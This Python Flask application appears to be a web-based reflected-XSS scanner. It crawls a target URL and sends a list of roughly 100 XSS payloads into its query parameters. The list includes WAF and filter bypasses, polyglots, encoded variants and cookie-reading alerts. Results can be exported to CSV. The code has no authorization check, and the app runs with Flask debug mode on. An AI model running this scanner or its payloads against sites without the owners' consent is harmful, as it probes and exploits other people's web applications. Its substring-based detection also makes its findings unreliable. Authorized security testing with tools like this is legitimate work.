from flask import Flask, render_template, request, jsonify, Response
import requests
import urllib.parse
import re
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
import json
import csv
import io
import os
from datetime import datetime
import hashlib
import random
import string

app = Flask(__name__)

class EnhancedXSSScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.stop_scan = False
        self.scan_results = []
        self.logs = []  # New logs collection
        self.current_scan_id = None
        self.scan_progress = 0
        self.total_tests = 0
        self.completed_tests = 0
        self.total_payloads = 0
        self.parameters_found = []
        self.scan_complete = False
        
        # Load enhanced payloads
        self.payloads = self.load_enhanced_payloads()
        self.total_payloads = len(self.payloads)
    
    def load_enhanced_payloads(self):
        """Load comprehensive XSS payloads"""
        payloads = [
            # Basic XSS Payloads
            '<script>alert("XSS_TEST_001")</script>',
            '<img src=x onerror=alert("XSS_TEST_002")>',
            '<svg onload=alert("XSS_TEST_003")>',
            '<iframe src="javascript:alert(\'XSS_TEST_004\')"></iframe>',
            '<body onload=alert("XSS_TEST_005")>',
            '<input onfocus=alert("XSS_TEST_006") autofocus>',
            '<select onfocus=alert("XSS_TEST_007") autofocus>',
            '<textarea onfocus=alert("XSS_TEST_008") autofocus>',
            '<video><source onerror="alert(\'XSS_TEST_009\')">',
            '<audio src=x onerror=alert("XSS_TEST_010")>',
            '<details open ontoggle=alert("XSS_TEST_011")>',
            '<marquee onstart=alert("XSS_TEST_012")>',
            
            # Context Breaking Payloads
            '"><script>alert("XSS_TEST_013")</script>',
            '\'><img src=x onerror=alert("XSS_TEST_014")>',
            '</title><script>alert("XSS_TEST_015")</script>',
            '</textarea><script>alert("XSS_TEST_016")</script>',
            '</style><script>alert("XSS_TEST_017")</script>',
            '</noscript><script>alert("XSS_TEST_018")</script>',
            
            # Event Handler Payloads
            '<div onmouseover="alert(\'XSS_TEST_019\')">test</div>',
            '<p onclick="alert(\'XSS_TEST_020\')">click</p>',
            '<button onmousedown="alert(\'XSS_TEST_021\')">press</button>',
            '<form onsubmit="alert(\'XSS_TEST_022\')"><input type=submit></form>',
            '<input type="text" onchange="alert(\'XSS_TEST_023\')">',
            '<select onchange="alert(\'XSS_TEST_024\')"><option>test</option></select>',
            
            # Advanced Bypass Payloads
            '<Img src = x onerror = "alert(\'XSS_TEST_025\')">',
            '<Video><source onerror = "alert(\'XSS_TEST_026\')">',
            '<img src=x:alert onerror=eval(src) alt="XSS_TEST_027">',
            '<iframe/src="data:text/html,<svg onload=alert(\'XSS_TEST_028\')>">',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,95,84,69,83,84,95,48,50,57,34,41))</script>',
            
            # Polyglot Payloads
            'jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload=alert("XSS_TEST_030")//>',
            '">\'><img src=x onerror=alert("XSS_TEST_031")>',
            '</script><script>alert("XSS_TEST_032")</script>',
            '"><svg/onload=alert("XSS_TEST_033")>',
            
            # Additional Enhanced Payloads
            '<script>alert("XSS_TEST_034")</script>',
            '<img src=x onerror=alert("XSS_TEST_035")>',
            '<svg onload=alert("XSS_TEST_036")>',
            '<iframe src="javascript:alert(\'XSS_TEST_037\')"></iframe>',
            '<body onload=alert("XSS_TEST_038")>',
            '<input onfocus=alert("XSS_TEST_039") autofocus>',
            '<select onfocus=alert("XSS_TEST_040") autofocus>',
            '<textarea onfocus=alert("XSS_TEST_041") autofocus>',
            '<video><source onerror="alert(\'XSS_TEST_042\')">',
            '<audio src=x onerror=alert("XSS_TEST_043")>',
            '<details open ontoggle=alert("XSS_TEST_044")>',
            '<marquee onstart=alert("XSS_TEST_045")>',
            '";alert("XSS_TEST_046");//',
            '\';alert("XSS_TEST_047");//',
            '<script>prompt("XSS_TEST_048")</script>',
            '<script>confirm("XSS_TEST_049")</script>',
            '<img src=1 href=1 onerror="javascript:alert(\'XSS_TEST_050\')">',
            '<svg><script>alert("XSS_TEST_051")</script></svg>',
            '<math><mi xlink:href="javascript:alert(\'XSS_TEST_052\')">test</mi></math>',
            '<object data="javascript:alert(\'XSS_TEST_053\')">',
            '<embed src="javascript:alert(\'XSS_TEST_054\')">',
            '<form><button formaction="javascript:alert(\'XSS_TEST_055\')">test</button></form>',
            '{{alert("XSS_TEST_056")}}',
            '${alert("XSS_TEST_057")}',
            '#{alert("XSS_TEST_058")}',
            '<%= alert("XSS_TEST_059") %>',
            '<script>alert(document.domain)</script>',
            '<script>alert(document.cookie)</script>',
            '<img src=x onerror="alert(document.domain)">',
            '<svg onload="alert(document.domain)">',
            '<iframe src="javascript:alert(document.domain)"></iframe>',
            
            # WAF Bypass Techniques
            '<ScRiPt>alert("XSS_TEST_060")</ScRiPt>',
            '<SCRIPT>alert("XSS_TEST_061")</SCRIPT>',
            '<script>alert("XSS_TEST_062")</script>',
            '<script>alert(/XSS_TEST_063/)</script>',
            '<script>alert`XSS_TEST_064`</script>',
            '<script>(alert)("XSS_TEST_065")</script>',
            '<script>a=alert,a("XSS_TEST_066")</script>',
            '<script>[].constructor.constructor("alert(\'XSS_TEST_067\')")()</script>',
            
            # Filter Bypass Techniques
            '<svg><animatetransform onbegin=alert("XSS_TEST_068")>',
            '<input type=image src onerror="alert(\'XSS_TEST_069\')">',
            '<isindex type=image src=1 onerror=alert("XSS_TEST_070")>',
            '<object data="javascript:alert(\'XSS_TEST_071\')">',
            '<embed src="javascript:alert(\'XSS_TEST_072\')">',
            '<form><button formaction="javascript:alert(\'XSS_TEST_073\')">test</button></form>',
            '<math><mi xlink:href="javascript:alert(\'XSS_TEST_074\')">test</mi></math>',
            
            # Template Injection
            '{{alert("XSS_TEST_075")}}',
            '${alert("XSS_TEST_076")}',
            '#{alert("XSS_TEST_077")}',
            '<%= alert("XSS_TEST_078") %>',
            
            # DOM-based Payloads
            '<script>document.write(\'<img src=x onerror=alert("XSS_TEST_079")>\')</script>',
            '<script>document.body.innerHTML=\'<img src=x onerror=alert("XSS_TEST_080")>\'</script>',
            '<script>eval(location.hash.slice(1))</script>#alert("XSS_TEST_081")',
            '<script>setTimeout(\'alert("XSS_TEST_082")\',1)</script>',
            '<script>setInterval(\'alert("XSS_TEST_083")\',1000)</script>',
            '<script>Function("alert(\'XSS_TEST_084\')")()</script>',
            
            # Additional Event Handlers
            '<div onload="alert(\'XSS_TEST_085\')">',
            '<div onerror="alert(\'XSS_TEST_086\')">',
            '<div onmouseenter="alert(\'XSS_TEST_087\')">',
            '<div onmouseleave="alert(\'XSS_TEST_088\')">',
            '<div onkeydown="alert(\'XSS_TEST_089\')">',
            '<div onkeyup="alert(\'XSS_TEST_090\')">',
            '<div onkeypress="alert(\'XSS_TEST_091\')">',
            '<div onblur="alert(\'XSS_TEST_092\')">',
            '<div onfocus="alert(\'XSS_TEST_093\')">',
            '<div onresize="alert(\'XSS_TEST_094\')">',
            '<div onscroll="alert(\'XSS_TEST_095\')">',
            
            # Encoded Payloads
            '%3Cscript%3Ealert(%22XSS_TEST_096%22)%3C/script%3E',
            '%3Cimg%20src=x%20onerror=alert(%22XSS_TEST_097%22)%3E',
            '&lt;script&gt;alert("XSS_TEST_098")&lt;/script&gt;',
            '&#60;script&#62;alert("XSS_TEST_099")&#60;/script&#62;',
            '<script>alert("XSS_TEST_100")</script>',
        ]
        return payloads
    
    def add_log(self, log_type, message, parameter=None, payload=None, result=None):
        """Add log entry with timestamp"""
        log_entry = {
            'timestamp': datetime.now().strftime('%H:%M:%S'),
            'type': log_type,
            'message': message,
            'parameter': parameter,
            'payload': payload,
            'result': result
        }
        self.logs.append(log_entry)
    
    def extract_payload_id(self, payload):
        """Extract unique ID from payload for tracking"""
        match = re.search(r'XSS_TEST_(\d+)', payload)
        return match.group(1) if match else None
    
    def is_payload_executed(self, response_text, payload):
        """Enhanced payload execution detection"""
        payload_id = self.extract_payload_id(payload)
        if not payload_id:
            return False, "No tracking ID found"
        
        # Check for exact payload reflection
        if payload in response_text:
            dangerous_contexts = [
                f'<script>{payload}',
                f'javascript:{payload}',
                f'onerror="{payload}"',
                f'onload="{payload}"',
                f'onclick="{payload}"'
            ]
            
            for context in dangerous_contexts:
                if context in response_text:
                    return True, f"Payload found in executable context"
            
            dangerous_chars = ['<', '>', '"', "'", 'script', 'alert']
            unencoded_chars = []
            
            for char in dangerous_chars:
                if char in payload and char in response_text:
                    unencoded_chars.append(char)
            
            if unencoded_chars:
                return True, f"Dangerous characters unencoded: {', '.join(unencoded_chars)}"
            
            return False, "Payload reflected but appears encoded/safe"
        
        return False, "Payload not found in response"
    
    def test_reflected_xss(self, url, param_name, payload):
        """Enhanced reflected XSS testing with logging"""
        if self.stop_scan:
            return {'stopped': True}
        
        try:
            # Log payload testing start
            self.add_log('info', f'Testing payload on parameter: {param_name}', param_name, payload[:50] + '...' if len(payload) > 50 else payload)
            
            # Parse URL and add payload to parameter
            parsed_url = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed_url.query)
            params[param_name] = [payload]
            
            new_query = urllib.parse.urlencode(params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            start_time = time.time()
            response = self.session.get(test_url, timeout=10)
            response_time = round((time.time() - start_time) * 1000, 2)
            
            # Enhanced payload detection
            is_executed, execution_details = self.is_payload_executed(response.text, payload)
            
            # Determine confidence level
            confidence = 'Low'
            if is_executed:
                if 'executable context' in execution_details:
                    confidence = 'High'
                elif 'unencoded' in execution_details:
                    confidence = 'Medium'
            
            result = {
                'vulnerable': is_executed,
                'type': 'reflected',
                'url': test_url,
                'parameter': param_name,
                'payload': payload,
                'payload_id': self.extract_payload_id(payload),
                'status_code': response.status_code,
                'response_time': response_time,
                'response_size': len(response.content),
                'confidence': confidence,
                'execution_details': execution_details,
                'response_snippet': response.text[:1000] if is_executed else ''
            }
            
            # Log result
            if is_executed:
                self.add_log('success', f'VULNERABILITY FOUND! Parameter: {param_name}', param_name, payload[:30] + '...', 'Vulnerable')
            else:
                self.add_log('info', f'No vulnerability found for parameter: {param_name}', param_name, payload[:30] + '...', 'Safe')
            
            # Update progress correctly
            self.completed_tests += 1
            self.scan_progress = (self.completed_tests / self.total_tests) * 100 if self.total_tests > 0 else 0
            
            return result
            
        except Exception as e:
            self.completed_tests += 1
            self.scan_progress = (self.completed_tests / self.total_tests) * 100 if self.total_tests > 0 else 0
            self.add_log('error', f'Error testing parameter {param_name}: {str(e)}', param_name, payload[:30] + '...', 'Error')
            return {'error': str(e), 'parameter': param_name, 'payload': payload}
    
    def crawl_url(self, url):
        """Enhanced URL crawling with logging"""
        try:
            self.add_log('info', f'Starting crawl of target URL: {url}')
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Find forms
            forms = []
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    if input_data['name'] and input_data['type'] not in ['submit', 'button', 'hidden']:
                        form_data['inputs'].append(input_data)
                
                if form_data['inputs']:
                    forms.append(form_data)
            
            # Find URL parameters
            parsed_url = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed_url.query)
            
            # Log discovered parameters
            if params:
                param_names = list(params.keys())
                self.add_log('success', f'Found {len(param_names)} URL parameters: {", ".join(param_names)}')
            else:
                self.add_log('warning', 'No URL parameters found, will test common parameter names')
            
            if forms:
                self.add_log('success', f'Found {len(forms)} forms with input fields')
            
            return {
                'forms': forms,
                'params': params,
                'base_url': url,
                'status_code': response.status_code,
                'response_size': len(response.content)
            }
            
        except Exception as e:
            self.add_log('error', f'Error crawling URL: {str(e)}')
            return {'error': str(e)}
    
    def scan_url(self, target_url, scan_id):
        """Enhanced main scanning function with comprehensive logging"""
        self.current_scan_id = scan_id
        self.stop_scan = False
        self.scan_results = []
        self.logs = []  # Reset logs for new scan
        self.scan_progress = 0
        self.completed_tests = 0
        self.scan_complete = False
        
        # Log scan start
        self.add_log('info', f'Starting XSS vulnerability scan for: {target_url}')
        
        results = {
            'target_url': target_url,
            'scan_id': scan_id,
            'vulnerabilities': [],
            'scan_summary': {
                'total_payloads': self.total_payloads,
                'total_tests': 0,
                'completed_tests': 0,
                'reflected_xss': 0,
                'total_vulnerabilities': 0,
                'high_confidence': 0,
                'medium_confidence': 0,
                'low_confidence': 0,
                'scan_start_time': datetime.now().isoformat(),
                'scan_status': 'running'
            }
        }
        
        # Crawl the target URL
        crawl_data = self.crawl_url(target_url)
        if 'error' in crawl_data:
            results['error'] = crawl_data['error']
            return results
        
        # Calculate total tests based on parameters found
        parameters_to_test = []
        
        if crawl_data['params']:
            parameters_to_test.extend(list(crawl_data['params'].keys()))
        else:
            # If no parameters found, try common ones
            parameters_to_test = ['q', 'search', 'query', 'id', 'page', 'url', 'redirect', 'return', 'callback', 'name', 'value', 'data']
            self.add_log('info', f'Testing common parameters: {", ".join(parameters_to_test)}')
        
        self.parameters_found = parameters_to_test
        self.total_tests = len(self.payloads) * len(parameters_to_test)
        results['scan_summary']['total_tests'] = self.total_tests
        
        self.add_log('info', f'Scan plan: {len(self.payloads)} payloads × {len(parameters_to_test)} parameters = {self.total_tests} total tests')
        
        vulnerabilities = []
        
        # Test each payload on each parameter
        for param_name in parameters_to_test:
            if self.stop_scan:
                self.add_log('warning', 'Scan stopped by user')
                break
                
            self.add_log('info', f'Starting tests for parameter: {param_name}')
            
            for payload in self.payloads:
                if self.stop_scan:
                    break
                    
                if crawl_data['params']:
                    result = self.test_reflected_xss(target_url, param_name, payload)
                else:
                    result = self.test_reflected_xss(f"{target_url}?{param_name}=test", param_name, payload)
                
                if result.get('vulnerable'):
                    vulnerabilities.append(result)
                    self.scan_results.append(result)
                    results['scan_summary']['reflected_xss'] += 1
                    
                    # Update confidence counters
                    if result.get('confidence') == 'High':
                        results['scan_summary']['high_confidence'] += 1
                    elif result.get('confidence') == 'Medium':
                        results['scan_summary']['medium_confidence'] += 1
                    else:
                        results['scan_summary']['low_confidence'] += 1
                
                # Small delay to prevent overwhelming the server
                time.sleep(0.1)
        
        # Mark scan as complete
        self.scan_complete = True
        self.scan_progress = 100
        
        # Log scan completion
        vuln_count = len(vulnerabilities)
        self.add_log('success', f'Scan completed! Found {vuln_count} vulnerabilities out of {self.total_tests} tests')
        
        results['vulnerabilities'] = vulnerabilities
        results['scan_summary']['total_vulnerabilities'] = len(vulnerabilities)
        results['scan_summary']['completed_tests'] = self.completed_tests
        results['scan_summary']['scan_end_time'] = datetime.now().isoformat()
        results['scan_summary']['scan_status'] = 'stopped' if self.stop_scan else 'completed'
        
        return results
    
    def stop_scanning(self):
        """Stop the current scan"""
        self.stop_scan = True
        self.add_log('warning', 'Scan stop requested by user')
    
    def get_scan_progress(self):
        """Get current scan progress with fixed calculation"""
        return {
            'progress': min(self.scan_progress, 100),
            'completed_tests': self.completed_tests,
            'total_tests': self.total_tests,
            'total_payloads': self.total_payloads,
            'parameters_found': len(self.parameters_found),
            'vulnerabilities_found': len(self.scan_results),
            'scan_complete': self.scan_complete
        }

# Global scanner instance
scanner = EnhancedXSSScanner()

@app.route('/')
def index():
    return render_template('fixed_scanner.html')

@app.route('/scan', methods=['POST'])
def scan():
    data = request.get_json()
    target_url = data.get('url')
    scan_id = data.get('scan_id', str(int(time.time())))
    
    if not target_url:
        return jsonify({'error': 'URL is required'})
    
    # Start scan in background thread
    def run_scan():
        results = scanner.scan_url(target_url, scan_id)
        return results
    
    thread = threading.Thread(target=run_scan)
    thread.daemon = True
    thread.start()
    
    return jsonify({'status': 'started', 'scan_id': scan_id})

@app.route('/scan_status/<scan_id>')
def scan_status(scan_id):
    progress_data = scanner.get_scan_progress()
    return jsonify({
        'scan_id': scan_id,
        'progress': progress_data['progress'],
        'completed_tests': progress_data['completed_tests'],
        'total_tests': progress_data['total_tests'],
        'total_payloads': progress_data['total_payloads'],
        'parameters_found': progress_data['parameters_found'],
        'vulnerabilities_found': progress_data['vulnerabilities_found'],
        'is_running': not scanner.stop_scan and scanner.current_scan_id == scan_id and not progress_data['scan_complete'],
        'scan_complete': progress_data['scan_complete'],
        'vulnerabilities': scanner.scan_results
    })

@app.route('/scan_logs/<scan_id>')
def scan_logs(scan_id):
    """New endpoint to fetch scan logs"""
    if scanner.current_scan_id == scan_id:
        return jsonify({'logs': scanner.logs})
    else:
        return jsonify({'logs': []})

@app.route('/stop_scan', methods=['POST'])
def stop_scan():
    scanner.stop_scanning()
    return jsonify({'status': 'stopped'})

@app.route('/export_csv')
def export_csv():
    output = io.StringIO()
    writer = csv.writer(output)
    
    # Write header
    writer.writerow(['Type', 'URL', 'Parameter', 'Payload', 'Payload ID', 'Status Code', 
                     'Response Time (ms)', 'Confidence', 'Execution Details'])
    
    # Write data
    for vuln in scanner.scan_results:
        writer.writerow([
            vuln.get('type', ''),
            vuln.get('url', ''),
            vuln.get('parameter', ''),
            vuln.get('payload', ''),
            vuln.get('payload_id', ''),
            vuln.get('status_code', ''),
            vuln.get('response_time', ''),
            vuln.get('confidence', ''),
            vuln.get('execution_details', '')
        ])
    
    output.seek(0)
    
    return Response(
        output.getvalue(),
        mimetype='text/csv',
        headers={'Content-Disposition': 'attachment; filename=xss_scan_results.csv'}
    )

if __name__ == '__main__':
    app.run(debug=True, threaded=True)
